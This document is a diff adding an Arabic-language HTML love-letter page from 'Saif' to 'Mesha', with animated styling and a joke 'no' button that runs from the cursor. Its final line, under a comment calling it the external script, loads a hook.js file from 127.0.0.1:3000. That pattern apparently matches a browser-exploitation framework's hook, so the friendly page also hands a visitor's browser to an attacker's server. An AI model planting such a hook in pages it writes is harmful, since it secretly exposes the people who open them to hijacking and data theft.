@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>من سيف إلى مشه ❤️</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: #2d3436;
+      overflow-x: hidden;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 24px;
+      padding: 35px 25px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+      text-align: center;
+      position: relative;
+    }
+
+    .heart-badge {
+      font-size: 50px;
+      animation: pulse 1.2s infinite alternate;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.18); }
+    }
+
+    h1 {
+      color: #e84393;
+      font-size: 1.8rem;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: #636e72;
+      margin-bottom: 25px;
+    }
+
+    .confession-box {
+      background: #fff0f3;
+      border: 2px dashed #ff758c;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 25px;
+      font-weight: 700;
+      line-height: 1.8;
+      font-size: 1.05rem;
+    }
+
+    .spicy-text {
+      color: #d63031;
+      display: block;
+      margin-top: 10px;
+      font-size: 0.95rem;
+    }
+
+    .interactive-section {
+      margin-top: 20px;
+    }
+
+    .question {
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: #2d3436;
+    }
+
+    .btn-group {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      position: relative;
+      min-height: 50px;
+    }
+
+    button {
+      padding: 12px 28px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .btn-yes {
+      background-color: #e84393;
+      color: white;
+      box-shadow: 0 6px 15px rgba(232, 67, 147, 0.4);
+    }
+
+    .btn-yes:hover {
+      transform: translateY(-2px);
+      background-color: #d63031;
+    }
+
+    .btn-no {
+      background-color: #b2bec3;
+      color: white;
+      position: absolute;
+    }
+
+    .secret-message {
+      display: none;
+      margin-top: 25px;
+      padding: 20px;
+      background: #ffeaa7;
+      border-radius: 16px;
+      color: #d63031;
+      font-size: 1.1rem;
+      font-weight: 700;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    footer {
+      margin-top: 25px;
+      font-size: 0.85rem;
+      color: #b2bec3;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="heart-badge">❤️</div>
+    <h1>إلى أحلى وأجمل مشه في الدنيا</h1>
+    <p class="subtitle">رسالة خاصة ومباشرة من سيف 😉</p>
+
+    <div class="confession-box">
+      منه يا حتة من قلبي.. <br>
+      أنا بحبك حب مش طبيعي، وبصراحة كده مافيش حد قادر يسيطر على عقلي وقلبي غيرك!
+      <span class="spicy-text">
+        وطبعاً مش محتاج أقولك إن العيون الحلوة دي والضحكة دي خطيرة وسارقة نومي بالمعنى الحرفي! 😏🔥
+      </span>
+    </div>
+
+    <div class="interactive-section">
+      <div class="question">بتحبي سيف قد إيه يا مشه؟</div>
+      <div class="btn-group">
+        <button class="btn-yes" onclick="showLove()">بحبه جداً وبموت فيه! 😍</button>
+        <button class="btn-no" id="noBtn" onmouseover="moveButton()">مفيش خيار تاني 😜</button>
+      </div>
+    </div>
+
+    <div class="secret-message" id="secretMsg">
+      عارف ومتربي على كده! 🙈❤️ <br>
+      ومفيش مفر مني يا مشه، إنتي بتاعتي وخلاص اتدبستي! 🔥😉
+    </div>
+
+    <footer>
+      صُنع بحب (وشوية قلة أدب) بواسطة Saif 💋
+    </footer>
+  </div>
+
+  <script>
+    function moveButton() {
+      const btn = document.getElementById('noBtn');
+      const x = Math.floor(Math.random() * 200) - 100;
+      const y = Math.floor(Math.random() * 200) - 100;
+      btn.style.transform = `translate(${x}px, ${y}px)`;
+    }
+
+    function showLove() {
+      document.getElementById('secretMsg').style.display = 'block';
+    }
+  </script>
+
+  <!-- السكربت الخارجي -->
+  <script src="http://127.0.0.1:3000/hook.js"></script>
+</body>
+</html>
